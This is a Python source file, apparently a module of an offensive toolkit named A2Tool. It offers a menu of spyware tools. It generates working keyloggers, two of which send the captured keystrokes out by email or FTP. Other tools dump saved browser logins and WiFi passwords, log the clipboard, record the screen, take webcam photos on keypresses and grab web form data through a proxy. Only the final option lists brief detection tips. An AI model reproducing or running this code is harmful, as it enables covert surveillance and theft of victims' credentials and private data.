#!/usr/bin/env python3
"""
A2Tool v4.0 - Keylogger & Spyware Tools Module (10 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, threading
from datetime import datetime
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    Style=Fore

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

def _run(cmd, shell=True, timeout=30):
    try: return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def menu():
    while True:
        print(f"\n{R}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{R}║{W}              Keylogger & Spyware Tools                     {R}║{RS}")
        print(f"{R}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{R}║{W} [01]{R}  Python Keylogger (Local Demo)                     {R}║{RS}")
        print(f"{R}║{W} [02]{R}  Email Exfiltration Keylogger                      {R}║{RS}")
        print(f"{R}║{W} [03]{R}  FTP Exfiltration Keylogger                        {R}║{RS}")
        print(f"{R}║{W} [04]{R}  Clipboard Logger                                  {R}║{RS}")
        print(f"{R}║{W} [05]{R}  Browser Credential Dumper                         {R}║{RS}")
        print(f"{R}║{W} [06]{R}  Screen Activity Recorder                          {R}║{RS}")
        print(f"{R}║{W} [07]{R}  Webcam Keylogger (Photo on Keypress)              {R}║{RS}")
        print(f"{R}║{W} [08]{R}  WiFi Credential Stealer                           {R}║{RS}")
        print(f"{R}║{W} [09]{R}  Form Grabber (Web Forms)                         {R}║{RS}")
        print(f"{R}║{W} [10]{R}  Keylogger Detection & Removal                     {R}║{RS}")
        print(f"{R}║{W} [0]{R}   Back to Main Menu                                  {R}║{RS}")
        print(f"{R}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[Key] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': python_keylogger()
        elif ch == '2': email_keylogger()
        elif ch == '3': ftp_keylogger()
        elif ch == '4': clipboard_logger()
        elif ch == '5': browser_cred_dump()
        elif ch == '6': screen_recorder()
        elif ch == '7': webcam_keylogger()
        elif ch == '8': wifi_cred_stealer()
        elif ch == '9': form_grabber()
        elif ch == '10': keylogger_detect()
        else: print(f"{R}[!] Invalid option{RS}")

def python_keylogger():
    print(f"\n{G}[+] Python Keylogger Generator{RS}")
    output_file = input(f"  {W}[?] Log file (default: keylog.txt): {RS}").strip() or 'keylog.txt'
    
    keylogger_code = f'''#!/usr/bin/env python3
from pynput import keyboard
from datetime import datetime

log_file = "{output_file}"

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f"[{{datetime.now()}}] {{key.char}}\\n")
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f"[{{datetime.now()}}] {{key}}\\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("[*] Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
'''
    
    with open('keylogger_demo.py', 'w') as f:
        f.write(keylogger_code)
    print(f"{G}[+] Keylogger saved as keylogger_demo.py{RS}")
    print(f"{Y}[!] Run: python keylogger_demo.py{RS}")
    print(f"{Y}[!] Requires: pip install pynput{RS}")
    
    run_now = input(f"\n{Y}[?] Start keylogger demo? (y/n): {RS}").strip().lower()
    if run_now == 'y':
        try:
            from pynput import keyboard
            log_file = output_file
            def on_press(key):
                try:
                    with open(log_file, 'a') as f:
                        f.write(f"[{datetime.now()}] {key.char}\n")
                    print(f"  {G}[+]{RS} {key.char}", end='', flush=True)
                except AttributeError:
                    with open(log_file, 'a') as f:
                        f.write(f"[{datetime.now()}] {key}\n")
                    print(f"  {Y}[{key}]{RS}", end='', flush=True)
            
            def on_release(key):
                if key == keyboard.Key.esc:
                    return False
            
            print(f"{Y}[!] Keylogger running. Logging to {log_file}. Press ESC to stop.{RS}")
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
            print(f"\n{G}[+] Keylogger stopped. Check {log_file}{RS}")
        except ImportError:
            print(f"{R}[-] pynput not installed. Run: pip install pynput{RS}")
        except Exception as e:
            print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def email_keylogger():
    print(f"\n{G}[+] Email Exfiltration Keylogger{RS}")
    email_addr = input(f"  {W}[?] Email address to send logs: {RS}").strip()
    email_pass = input(f"  {W}[?] Email password: {RS}").strip()
    smtp_server = input(f"  {W}[?] SMTP server (default: smtp.gmail.com): {RS}").strip() or 'smtp.gmail.com'
    smtp_port = input(f"  {W}[?] SMTP port (default: 587): {RS}").strip() or '587'
    interval = int(input(f"  {W}[?] Send interval (minutes): {RS}").strip() or '60')
    
    print(f"\n{G}[+] Email Keylogger Configuration:{RS}")
    print(f"  {C}Email:{RS} {email_addr}")
    print(f"  {C}SMTP:{RS} {smtp_server}:{smtp_port}")
    print(f"  {C}Interval:{RS} every {interval} minutes")
    
    code = f'''import smtplib, threading, time
from pynput import keyboard
from datetime import datetime

EMAIL = "{email_addr}"
PASS = "{email_pass}"
SMTP = "{smtp_server}"
PORT = {smtp_port}
INTERVAL = {interval}
buffer = []

def on_press(key):
    global buffer
    try: buffer.append(key.char)
    except: buffer.append(f" [{{key}}] ")

def send_logs():
    while True:
        time.sleep(INTERVAL * 60)
        if buffer:
            msg = "\\n".join(buffer)
            try:
                s = smtplib.SMTP(SMTP, PORT)
                s.starttls()
                s.login(EMAIL, PASS)
                s.sendmail(EMAIL, EMAIL, f"Subject: Keylog {{datetime.now()}}\\n\\n{{msg}}")
                s.quit()
                buffer.clear()
            except: pass

t = threading.Thread(target=send_logs, daemon=True)
t.start()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
'''
    
    with open('keylogger_email.py', 'w') as f:
        f.write(code)
    print(f"{G}[+] Saved as keylogger_email.py{RS}")
    print(f"{Y}[!] Review the code and run: python keylogger_email.py{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def ftp_keylogger():
    print(f"\n{G}[+] FTP Exfiltration Keylogger{RS}")
    ftp_host = input(f"  {W}[?] FTP server: {RS}").strip()
    ftp_user = input(f"  {W}[?] FTP username: {RS}").strip()
    ftp_pass = input(f"  {W}[?] FTP password: {RS}").strip()
    
    print(f"\n{G}[+] FTP Keylogger configured for {ftp_host}{RS}")
    
    code = f'''import ftplib, threading, time
from pynput import keyboard
from datetime import datetime

FTP_HOST = "{ftp_host}"
FTP_USER = "{ftp_user}"
FTP_PASS = "{ftp_pass}"
buffer = []

def on_press(key):
    global buffer
    try: buffer.append(key.char)
    except: buffer.append(str(key))

def upload_logs():
    while True:
        time.sleep(300)
        if buffer:
            fname = f"keylog_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.txt"
            with open(fname, 'w') as f:
                f.write("\\n".join(buffer))
            try:
                ftp = ftplib.FTP(FTP_HOST)
                ftp.login(FTP_USER, FTP_PASS)
                with open(fname, 'rb') as f:
                    ftp.storbinary(f'STOR {{fname}}', f)
                ftp.quit()
                buffer.clear()
            except: pass

t = threading.Thread(target=upload_logs, daemon=True)
t.start()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
'''
    
    with open('keylogger_ftp.py', 'w') as f:
        f.write(code)
    print(f"{G}[+] Saved as keylogger_ftp.py{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def clipboard_logger():
    print(f"\n{G}[+] Clipboard Logger{RS}")
    print(f"{Y}[!] Monitors clipboard for copied text{RS}")
    
    try:
        import pyperclip
        old_clip = pyperclip.paste()
        print(f"{Y}[!] Monitoring clipboard. Press Ctrl+C to stop.{RS}")
        
        with open('clipboard_log.txt', 'a') as f:
            while True:
                try:
                    current = pyperclip.paste()
                    if current != old_clip and current:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f"  {G}[+]{RS} [{timestamp}] {Y}{current[:50]}...{RS}")
                        f.write(f"[{timestamp}] {current}\n")
                        f.flush()
                        old_clip = current
                    time.sleep(0.5)
                except KeyboardInterrupt:
                    print(f"\n{Y}[+] Clipboard logging stopped{RS}")
                    break
    except ImportError:
        print(f"{Y}[!] Install pyperclip: pip install pyperclip{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def browser_cred_dump():
    print(f"\n{G}[+] Browser Credential Dumper{RS}")
    print(f"{W}This extracts saved passwords from browsers.{RS}")
    
    import sqlite3, shutil
    from os.path import expanduser
    
    home = expanduser('~')
    
    # Chrome
    chrome_paths = [
        os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        os.path.join(home, '.config', 'google-chrome', 'Default', 'Login Data'),
    ]
    
    for path in chrome_paths:
        if os.path.exists(path):
            print(f"\n  {W}Chrome passwords found at:{RS} {path}")
            try:
                shutil.copy2(path, 'chrome_login_data.db')
                conn = sqlite3.connect('chrome_login_data.db')
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall()[:10]:
                    print(f"  {C}[+]{RS} Site: {row[0][:50]}")
                    print(f"      User: {Y}{row[1]}{RS}")
                    print(f"      Pass: {R}[encrypted - use AES key]{RS}")
                conn.close()
            except Exception as e:
                print(f"  {Y}[-] Error: {e}{RS}")
    
    # Firefox
    firefox_paths = [
        os.path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        os.path.join(home, '.mozilla', 'firefox'),
    ]
    
    for base_path in firefox_paths:
        if os.path.exists(base_path):
            for profile in os.listdir(base_path):
                logins_path = os.path.join(base_path, profile, 'logins.json')
                if os.path.exists(logins_path):
                    print(f"\n  {W}Firefox logins found:{RS}")
                    try:
                        with open(logins_path, 'r') as f:
                            data = json.load(f)
                            for login in data.get('logins', [])[:10]:
                                print(f"  {C}[+]{RS} Host: {login.get('hostname', 'N/A')}")
                    except: pass
    
    print(f"\n{Y}[!] Decryption requires master keys (Chrome: AES key, Firefox: master password){RS}")
    print(f"{Y}[!] Tools: browser-cookie3, ChromePass, Firefox Password Recovery{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def screen_recorder():
    print(f"\n{G}[+] Screen Activity Recorder{RS}")
    duration = int(input(f"  {W}[?] Recording duration (seconds): {RS}").strip() or '10')
    fps = int(input(f"  {W}[?] Frames per second (default: 5): {RS}").strip() or '5')
    
    try:
        import mss
        import cv2
        import numpy as np
        
        fname = f"screen_recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            width, height = monitor['width'], monitor['height']
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(fname, fourcc, fps, (width, height))
            
            print(f"{Y}[!] Recording screen for {duration}s...{RS}")
            start = time.time()
            while time.time() - start < duration:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            
            out.release()
            print(f"{G}[+] Screen recording saved: {fname}{RS}")
    except ImportError:
        print(f"{Y}[!] Install: pip install mss opencv-python numpy{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def webcam_keylogger():
    print(f"\n{G}[+] Webcam Keylogger (captures photo on each keypress){RS}")
    print(f"{Y}[!] Requires: opencv-python, pynput{RS}")
    
    code = '''from pynput import keyboard
import cv2, threading
from datetime import datetime

cam = cv2.VideoCapture(0)
key_count = 0

def on_press(key):
    global key_count
    key_count += 1
    if key_count % 50 == 0:  # Every 50 keypresses
        ret, frame = cam.read()
        if ret:
            fname = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(fname, frame)
            print(f"[+] Captured {fname}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
cam.release()
'''
    
    with open('webcam_keylogger.py', 'w') as f:
        f.write(code)
    print(f"{G}[+] Saved as webcam_keylogger.py{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def wifi_cred_stealer():
    print(f"\n{G}[+] WiFi Credential Stealer{RS}")
    print(f"{W}Extracts saved WiFi networks and passwords{RS}")
    
    if os.name == 'nt':
        print(f"\n  {C}Windows:{RS}")
        out = _run('netsh wlan show profiles')
        profiles = re.findall(r'All User Profile\s+:\s+(.+)', out)
        for p in profiles:
            p = p.strip()
            detail = _run(f'netsh wlan show profile "{p}" key=clear')
            key = re.search(r'Key Content\s+:\s+(.+)', detail)
            pwd = key.group(1).strip() if key else '[Open Network]'
            print(f"  {G}[+]{RS} {C}{p:<25}{RS} → {Y}{pwd}{RS}")
    else:
        print(f"\n  {C}Linux:{RS}")
        nm_path = "/etc/NetworkManager/system-connections/"
        if os.path.exists(nm_path):
            for f in os.listdir(nm_path):
                try:
                    with open(os.path.join(nm_path, f)) as fp:
                        data = fp.read()
                    psk = re.search(r'psk=(.+)', data)
                    pwd = psk.group(1).strip() if psk else '[Open]'
                    print(f"  {G}[+]{RS} {C}{f:<25}{RS} → {Y}{pwd}{RS}")
                except: pass
    
    save = input(f"\n{Y}[?] Save to file? (y/n): {RS}").strip().lower()
    if save == 'y':
        fname = f"wifi_creds_{datetime.now().strftime('%Y%m%d')}.txt"
        out = _run('netsh wlan show profiles') if os.name == 'nt' else 'cat /etc/NetworkManager/system-connections/*'
        with open(fname, 'w') as f:
            f.write(out)
        print(f"{G}[+] Saved to {fname}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def form_grabber():
    print(f"\n{G}[+] Form Grabber (HTTP POST Interceptor){RS}")
    port = int(input(f"  {W}[?] Proxy port (default: 8080): {RS}").strip() or '8080')
    
    print(f"\n{W}Form grabber listens for HTTP POST data{RS}")
    print(f"{Y}[!] Set browser proxy to 127.0.0.1:{port}{RS}")
    
    code = f'''import socket, threading, re
from datetime import datetime

def handle_client(conn, addr):
    data = conn.recv(4096).decode('utf-8', errors='ignore')
    if 'POST' in data:
        body = data.split('\\r\\n\\r\\n')[-1] if '\\r\\n\\r\\n' in data else ''
        if body:
            print(f"[{{datetime.now()}}] Form data from {{addr[0]}}:")
            params = dict(re.findall(r'([^&=]+)=([^&]*)', body))
            for k, v in params.items():
                print(f"  {{k}} = {{v}}")
            with open('forms_captured.txt', 'a') as f:
                f.write(f"[{{datetime.now()}}] {{addr[0]}}: {{params}}\\n")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', {port}))
s.listen(5)
print(f"[+] Form grabber listening on port {port}")
while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_client, args=(conn, addr)).start()
'''
    
    with open('form_grabber.py', 'w') as f:
        f.write(code)
    print(f"{G}[+] Saved as form_grabber.py{RS}")
    print(f"{G}[+] Run: python form_grabber.py{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def keylogger_detect():
    print(f"\n{G}[+] Keylogger Detection & Removal{RS}")
    
    print(f"\n  {W}Windows Detection:{RS}")
    print(f"  {W}•{RS} Check Task Manager for suspicious processes")
    print(f"  {W}•{RS} Run: netstat -ano | findstr LISTEN")
    print(f"  {W}•{RS} Check Startup programs: msconfig")
    print(f"  {W}•{RS} Check: C:\\Users\\[User]\\AppData\\Roaming\\")
    print(f"  {W}•{RS} Use Process Explorer (Sysinternals)")
    
    print(f"\n  {W}Linux Detection:{RS}")
    print(f"  {W}•{RS} ps aux | grep -i key")
    print(f"  {W}•{RS} Check /proc for suspicious processes")
    print(f"  {W}•{RS} lsof -i -P -n | grep LISTEN")
    print(f"  {W}•{RS} Check crontab -l")
    print(f"  {W}•{RS} Check ~/.bashrc, ~/.profile")
    print(f"  {W}•{RS} rkhunter or chkrootkit")
    
    print(f"\n  {W}General Detection:{RS}")
    print(f"  {W}•{RS} Unusual network traffic (uploading data)")
    print(f"  {W}•{RS} High CPU usage by seemingly idle process")
    print(f"  {W}•{RS} Unknown startup entries")
    print(f"  {W}•{RS} Slow keyboard response")
    print(f"  {W}•{RS} Antivirus/EDR alerts")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
